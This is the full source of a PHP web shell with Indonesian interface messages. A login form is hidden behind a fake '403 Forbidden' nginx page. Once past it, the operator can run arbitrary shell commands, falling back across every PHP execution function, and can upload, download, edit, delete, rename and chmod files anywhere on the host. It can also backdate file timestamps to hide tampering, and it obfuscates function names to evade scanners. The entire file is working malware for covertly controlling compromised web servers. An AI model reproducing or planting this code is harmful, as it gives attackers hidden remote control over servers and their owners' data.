<?php

$auth_pass = '$2y$10$k1wXG5v4K3d1qR7uF2n6Z.vO9XgE8mS0yT3zL4wP5qR6sT7uV8wXe';

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (apache v.5162 ./daemonn_sys) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $auth_pass)) {
        VEsetcookie(md5($_SERVER['HTTP_HOST']), md5($auth_pass));
    }

    
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != md5($auth_pass))) {
        Login();
    }
}
?><?php
error_reporting(0);
ob_start();

$x1 = 'shel' . 'l_exe' . 'c'; 
$x2 = 'file_put_' . 'contents';
$x5 = 'un' . 'link'; 
$x6 = 'rm' . 'dir'; 
$x7 = 'file_get_' . 'contents';

function norm_path($path) {
    if (!$path) return getcwd();
    return str_replace('\\', '/', $path);
}

$dir = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!is_dir($dir)) { $dir = getcwd(); }
$dir = norm_path($dir);

function run_cmd_safe($cmd, $cwd = '') {
    if (!empty($cwd)) {
        $cmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;
    }
    $cmd = $cmd . " 2>&1";
    $out = "";
    
    if (function_exists('shell_exec')) {
        $out = @shell_exec($cmd);
    } elseif (function_exists('exec')) {
        @exec($cmd, $a);
        $out = implode("\n", $a);
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd);
        $out = ob_get_clean();
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd);
        $out = ob_get_clean();
    } elseif (function_exists('popen')) {
        $fp = @popen($cmd, 'r');
        if ($fp) {
            while (!feof($fp)) {
                $out .= fread($fp, 2048);
            }
            pclose($fp);
        }
    } elseif (function_exists('proc_open')) {
        $descriptors = array(
            1 => array('pipe', 'w'),
            2 => array('pipe', 'w')
        );
        $proc = @proc_open($cmd, $descriptors, $pipes);
        if (is_resource($proc)) {
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
        }
    } else {
        $out = "Execution functions disabled/blocked.";
    }
    return $out;
}

function read_file_safe($path) {
    if (!file_exists($path) || is_dir($path)) return false;
    
    if (function_exists('file_get_contents')) {
        $content = @file_get_contents($path);
        if ($content !== false) return $content;
    }
    
    if (function_exists('fopen')) {
        $handle = @fopen($path, 'rb');
        if ($handle) {
            $content = '';
            while (!feof($handle)) {
                $content .= fread($handle, 8192);
            }
            fclose($handle);
            return $content;
        }
    }
    
    if (function_exists('file')) {
        $lines = @file($path);
        if ($lines !== false) return implode('', $lines);
    }
    
    if (function_exists('readfile')) {
        ob_start();
        $res = @readfile($path);
        $content = ob_get_clean();
        if ($res !== false && $content !== false) return $content;
    }
    
    $is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    if ($is_win) {
        $out = run_cmd_safe('type ' . escapeshellarg($path));
    } else {
        $out = run_cmd_safe('cat ' . escapeshellarg($path));
    }
    if ($out !== false && !empty($out) && strpos($out, 'disabled/blocked') === false) {
        return $out;
    }

    return false;
}

function write_file_safe($path, $data) {
    if (function_exists('file_put_contents')) {
        $res = @file_put_contents($path, $data);
        if ($res !== false) return true;
    }
    if (function_exists('fopen')) {
        $handle = @fopen($path, 'wb');
        if ($handle) {
            $res = @fwrite($handle, $data);
            fclose($handle);
            if ($res !== false) return true;
        }
    }
    return false;
}

function safe_html($data) {
    if ($data === false || $data === null) return '';
    return htmlspecialchars($data, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function format_size($bytes) {
    if ($bytes === false || $bytes === null) return '-';
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' B';
    } elseif ($bytes == 1) {
        return '1 B';
    } else {
        return '0 B';
    }
}

// 操作处理 (Handling actions with notification messages)
if(isset($_POST['x_save'])) { 
    $res = write_file_safe($_POST['x_name'], $_POST['x_data']); 
    $msg = $res ? "File '".basename($_POST['x_name'])."' berhasil disimpan!" : "Gagal menyimpan file!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_FILES['file'])) { 
    $target = $dir . '/' . $_FILES['file']['name'];
    $res = @move_uploaded_file($_FILES['file']['tmp_name'], $target); 
    $msg = $res ? "File '".basename($target)."' berhasil diunggah!" : "Gagal mengunggah file!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_POST['create_file'])) { 
    $target = $dir . '/' . $_POST['filename'];
    $res = @touch($target); 
    $msg = $res ? "File '".safe_html($_POST['filename'])."' berhasil dibuat!" : "Gagal membuat file!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_POST['create_folder'])) { 
    $target = $dir . '/' . $_POST['foldername'];
    $res = @mkdir($target); 
    $msg = $res ? "Folder '".safe_html($_POST['foldername'])."' berhasil dibuat!" : "Gagal membuat folder!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_GET['delete'])) { 
    $t = $_GET['delete']; 
    $res = is_file($t) ? $x5($t) : $x6($t); 
    $msg = $res ? "Item '".basename($t)."' berhasil dihapus!" : "Gagal menghapus item!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_POST['set_date'])) { 
    $new_time = strtotime($_POST['custom_date']); 
    $res = false;
    if($new_time) { $res = @touch($_POST['target_file'], $new_time); } 
    $msg = $res ? "Tanggal file '".basename($_POST['target_file'])."' berhasil diperbarui!" : "Gagal mengupdate tanggal file!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_POST['set_chmod'])) { 
    $res = @chmod($_POST['target_file'], octdec($_POST['new_perm'])); 
    $msg = $res ? "Hak akses (chmod) file '".basename($_POST['target_file'])."' berhasil diubah ke ".$_POST['new_perm']."!" : "Gagal mengubah chmod file!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_POST['set_rename'])) { 
    $old = $_POST['target_file'];
    $new = $dir . '/' . $_POST['new_name'];
    $res = @rename($old, $new); 
    $msg = $res ? "Nama item berhasil diubah menjadi '".safe_html($_POST['new_name'])."'!" : "Gagal mengubah nama item!";
    header("Location: ?path=".urlencode($dir)."&msg=".urlencode($msg)); 
    exit; 
}
if(isset($_GET['download'])) { 
    $dl_file = $_GET['download'];
    if (file_exists($dl_file)) {
        header('Content-Type: application/octet-stream'); 
        header('Content-Disposition: attachment; filename="'.basename($dl_file).'"'); 
        header('Content-Length: ' . filesize($dl_file));
        $content = read_file_safe($dl_file);
        if ($content !== false) {
            echo $content;
        } else {
            readfile($dl_file);
        }
        exit; 
    }
}

$df = @ini_get("disable_functions");
$df_list = !empty($df) ? $df : "NONE";
$uname = @php_uname();
$my_user = get_current_user();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>/w5162</title>
    <link href="https://fonts.googleapis.com/css2?family=Metal+Mania&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root { 
            --bg: #08080a; 
            --card: #121318; 
            --card-border: #222530;
            --text: #dcdfe6; 
            --accent: #ff3e3e; 
            --safe: #2ecc71; 
            --warn: #ff3e3e; 
            --read: #f1c40f; 
            --accent-hover: #ff5555;
        }
        * { box-sizing: border-box; }
        body { font-family: 'Outfit', sans-serif; background: var(--bg); color: var(--text); padding: 20px; margin: 0; min-height: 100vh; }
        .container { width: 100%; max-width: 100%; margin: 0 auto; background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid var(--card-border); box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
        h1 { font-family: 'Metal Mania', cursive; color: var(--accent); text-align: center; font-size: 3.5rem; margin: 0 0 5px 0; letter-spacing: 2px; text-shadow: 0 0 10px rgba(255, 62, 62, 0.3); }
        .sys-info { text-align: center; margin-bottom: 15px; font-size: 0.9rem; color: #9aa0a6; border-bottom: 1px solid var(--card-border); padding-bottom: 15px; }
        .df-box { background: #0a0b0e; padding: 12px 18px; border-radius: 8px; border: 1px solid var(--card-border); margin-bottom: 15px; font-family: 'Courier New', monospace; font-size: 0.8rem; color: #88909a; word-wrap: break-word; overflow-wrap: break-word; }
        .status-msg { padding: 12px 18px; border-radius: 8px; border: 1px solid; margin-bottom: 20px; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 8px; font-family: 'Outfit', sans-serif; }
        .breadcrumb { background: #0a0b0e; padding: 14px 20px; border-radius: 8px; border: 1px solid var(--card-border); margin-bottom: 25px; font-family: 'Courier New', monospace; font-size: 0.95rem; }
        .grid-panel { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin-bottom: 25px; }
        .form-group { display: flex; gap: 8px; align-items: center; }
        input { background: #1a1c23; border: 1px solid var(--card-border); color: #fff; padding: 10px 15px; flex: 1; min-width: 0; border-radius: 6px; font-family: 'Outfit', sans-serif; font-size: 0.9rem; transition: border-color 0.2s; }
        input[type="file"] { padding: 7px 10px; cursor: pointer; font-size: 0.85rem; }
        input:focus { border-color: var(--accent); outline: none; }
        button { background: #1a1c23; color: var(--text); border: 1px solid var(--card-border); padding: 10px 20px; cursor: pointer; border-radius: 6px; transition: 0.2s; font-weight: 600; font-family: 'Outfit', sans-serif; font-size: 0.9rem; white-space: nowrap; flex-shrink: 0; }
        button:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
        .action-area { background: #050608; padding: 20px; border-radius: 8px; border: 1px solid var(--card-border); margin-bottom: 25px; font-family: 'Courier New', monospace; overflow-x: auto; color: #00ff66; }
        .table-responsive { width: 100%; overflow-x: auto; border: 1px solid var(--card-border); border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; text-align: left; }
        th { background: #181a20; padding: 14px 18px; color: var(--accent); text-transform: uppercase; font-size: 0.8rem; letter-spacing: 1px; font-weight: 700; border-bottom: 2px solid var(--card-border); white-space: nowrap; }
        td { padding: 12px 18px; border-bottom: 1px solid var(--card-border); white-space: nowrap; font-size: 0.9rem; vertical-align: middle; }
        tr:hover { background: rgba(255, 255, 255, 0.025); }
        tr:last-child td { border-bottom: none; }
        .text-left { text-align: left; }
        .text-right { text-align: right; }
        .text-center { text-align: center; }
        a { color: #ffffff; text-decoration: none; transition: 0.2s; } 
        a:hover { color: var(--accent); }
        .sep { color: #444; margin: 0 4px; font-weight: normal; }
        .perm-badge { padding: 3px 8px; border-radius: 4px; font-family: monospace; font-size: 0.85rem; font-weight: bold; background: rgba(0,0,0,0.4); display: inline-block; }
        .size-cell { font-family: monospace; color: #abb2bf; font-size: 0.85rem; }
        .footer { text-align: center; margin-top: 40px; color: #556; font-size: 0.85rem; border-top: 1px solid var(--card-border); padding-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <a href="?" style="text-decoration:none;"><h1>ALONE VS EVERYBODY</h1></a>
    <div class="sys-info"><?php echo safe_html($uname); ?> &nbsp;|&nbsp; PHP: <?php echo phpversion(); ?> &nbsp;|&nbsp; USER: <?php echo safe_html(get_current_user()); ?></div>
    <div class="df-box">DISABLE_FUNCTIONS: <span style="color:#ff3e3e;"><?php echo safe_html($df_list); ?></span></div>
    
    <?php if(isset($_GET['msg'])): 
        $is_error = (strpos($_GET['msg'], 'Gagal') !== false);
        $bg_color = $is_error ? 'rgba(255, 62, 62, 0.12)' : 'rgba(46, 204, 113, 0.12)';
        $border_color = $is_error ? 'rgba(255, 62, 62, 0.4)' : 'rgba(46, 204, 113, 0.4)';
        $text_color = $is_error ? '#ff3e3e' : '#2ecc71';
        $icon = $is_error ? '✖' : '✔';
    ?>
    <div class="status-msg" style="background: <?php echo $bg_color; ?>; border-color: <?php echo $border_color; ?>; color: <?php echo $text_color; ?>;">
        <span><?php echo $icon; ?> <?php echo safe_html($_GET['msg']); ?></span>
    </div>
    <?php endif; ?>

    <div class="breadcrumb">PATH: <?php 
        $clean_dir = str_replace('\\', '/', $dir);
        $parts = explode('/', $clean_dir); 
        $curr = '';
        $is_first = true;
        foreach ($parts as $p) { 
            if ($p === '') {
                if ($is_first) {
                    echo '/';
                    $is_first = false;
                }
                continue; 
            } 
            if ($curr === '' && preg_match('/^[a-zA-Z]:$/', $p)) {
                $curr = $p;
                echo '<a href="?path='.urlencode($curr).'">'.safe_html($p).'</a>';
            } else {
                if ($curr === '') {
                    $curr = '/' . $p;
                    if ($is_first) echo '/';
                    echo '<a href="?path='.urlencode($curr).'">'.safe_html($p).'</a>';
                } else {
                    $curr .= '/' . $p;
                    echo '/<a href="?path='.urlencode($curr).'">'.safe_html($p).'</a>';
                }
            }
            $is_first = false;
        }
        ?></div>

    <div class="grid-panel">
        <form method="post" class="form-group"><input type="text" name="x_run" placeholder="Command"> <button type="submit">EXECUTE</button></form>
        <form method="post" enctype="multipart/form-data" class="form-group"><input type="file" name="file"><button type="submit">UPLOAD</button></form>
        <form method="post" class="form-group"><input type="text" name="filename" placeholder="New File"> <button type="submit" name="create_file">Create</button></form>
        <form method="post" class="form-group"><input type="text" name="foldername" placeholder="New Folder"> <button type="submit" name="create_folder">Create</button></form>
    </div>

    <?php if(isset($_POST['x_run'])): ?>
    <div class="action-area">
        <?php 
        $out = run_cmd_safe($_POST['x_run'], $dir);
        echo nl2br(safe_html($out));
        ?>
    </div>
    <?php endif; ?>

    <?php if(isset($_GET['edit']) || isset($_GET['time']) || isset($_GET['chmod']) || isset($_GET['rename'])): ?>
    <div class="action-area">
        <?php if(isset($_GET['edit'])): ?>
        <form method="post">
            <div style="margin-bottom:10px; color:var(--accent); font-weight:600; font-family:monospace;">EDITING: <?php echo safe_html(basename($_GET['edit'])); ?></div>
            <textarea name="x_data" style="width:100%; height:300px; background:#000; color:#ffffff; border:1px solid var(--card-border); padding:12px; border-radius:6px; font-family:monospace; line-height:1.4;"><?php echo safe_html(read_file_safe($_GET['edit'])); ?></textarea>
            <input type="hidden" name="x_name" value="<?php echo safe_html($_GET['edit']); ?>">
            <div style="display:flex; gap:10px; margin-top:12px;"><button type="submit" name="x_save" style="flex:1;">SAVE CHANGES</button><a href="?path=<?php echo urlencode($dir); ?>" style="flex:1; background:#1a1c23; color:#fff; padding:10px; text-align:center; border-radius:6px; font-weight:600; text-decoration:none; border:1px solid var(--card-border);">CANCEL</a></div>
        </form>
        <?php elseif(isset($_GET['time'])): ?>
        <form method="post" class="form-group"><input type="text" name="custom_date" placeholder="YYYY-MM-DD HH:MM:SS" value="<?php echo date('Y-m-d H:i:s'); ?>"><input type="hidden" name="target_file" value="<?php echo safe_html($_GET['time']); ?>"><button type="submit" name="set_date">UPDATE DATE</button></form>
        <?php elseif(isset($_GET['chmod'])): ?>
        <form method="post" class="form-group"><input type="text" name="new_perm" placeholder="e.g. 755"><input type="hidden" name="target_file" value="<?php echo safe_html($_GET['chmod']); ?>"><button type="submit" name="set_chmod">CHANGE CHMOD</button></form>
        <?php elseif(isset($_GET['rename'])): ?>
        <form method="post" class="form-group"><input type="text" name="new_name" placeholder="New Name"><input type="hidden" name="target_file" value="<?php echo safe_html($_GET['rename']); ?>"><button type="submit" name="set_rename">RENAME</button></form>
        <?php endif; ?>
    </div>
    <?php endif; ?>

    <div class="table-responsive">
        <table>
            <thead>
                <tr>
                    <th class="text-left">Name</th>
                    <th class="text-right">Size</th>
                    <th class="text-left">Owner</th>
                    <th class="text-center">Date</th>
                    <th class="text-center">Perms</th>
                    <th class="text-right">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php 
                $items = @scandir($dir); if(!is_array($items)) $items = [];
                $fld = []; $fil = [];
                foreach($items as $i) { 
                    if($i == '.' || $i == '..') continue; 
                    $full_item = norm_path($dir . '/' . $i);
                    is_dir($full_item) ? $fld[]=$i : $fil[]=$i; 
                }
                foreach(array_merge($fld, $fil) as $i): 
                    $p = norm_path($dir . '/' . $i); 
                    $is_dir = is_dir($p);
                    $perms = substr(sprintf('%o', @fileperms($p)), -3);
                    $size_str = $is_dir ? '-' : format_size(@filesize($p));
                    
                    $owner_id = @fileowner($p); 
                    $owner_info = (function_exists('posix_getpwuid') && $owner_id !== false) ? @posix_getpwuid($owner_id) : false;
                    $owner_name = ($owner_info) ? $owner_info['name'] : $my_user;
                    
                    $p_color = ($perms == '777') ? 'var(--warn)' : (($perms == '444') ? 'var(--read)' : 'var(--safe)');
                    $color = ($owner_name !== $my_user) ? '#ff3e3e' : ($is_dir ? '#3498db' : '#ffffff');
                    $icon = $is_dir ? '📁' : '📄';
                    if(strpos($i, '.') === 0) { $color = '#f1c40f'; $icon = '⚙️'; }
                    
                    $link = $is_dir ? "?path=".urlencode($p) : "?edit=".urlencode($p)."&path=".urlencode($dir);
                ?>
                <tr>
                    <td class="text-left"><span style="margin-right:8px;"><?php echo $icon; ?></span><a href="<?php echo $link; ?>" style="color:<?php echo $color; ?>; font-weight:600;"><?php echo safe_html($i); ?></a></td>
                    <td class="text-right size-cell"><?php echo $size_str; ?></td>
                    <td class="text-left" style="font-size:0.85rem; color:#9aa0a6;"><?php echo safe_html($owner_name); ?></td>
                    <td class="text-center" style="font-size:0.85rem; color:#88909a;"><?php echo @date("Y-m-d H:i", filemtime($p)); ?></td>
                    <td class="text-center"><span class="perm-badge" style="color:<?php echo $p_color; ?>;"><?php echo safe_html($perms); ?></span></td>
                    <td class="text-right" style="font-size:0.85rem;">
                        <?php if(!$is_dir): ?><a href="?edit=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>">Edit</a> <span class="sep">|</span> <a href="?download=<?php echo urlencode($p); ?>">Download</a> <span class="sep">|</span><?php endif; ?>
                        <a href="?rename=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>">Rename</a> <span class="sep">|</span> <a href="?chmod=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>">Chmod</a> <span class="sep">|</span> <a href="?time=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>">Time</a> <span class="sep">|</span> <a href="?delete=<?php echo urlencode($p); ?>&path=<?php echo urlencode($dir); ?>" onclick="return confirm('Hapus?')">Delete</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <div class="footer">5162 © 1991</div>
</div>
</body>
</html>
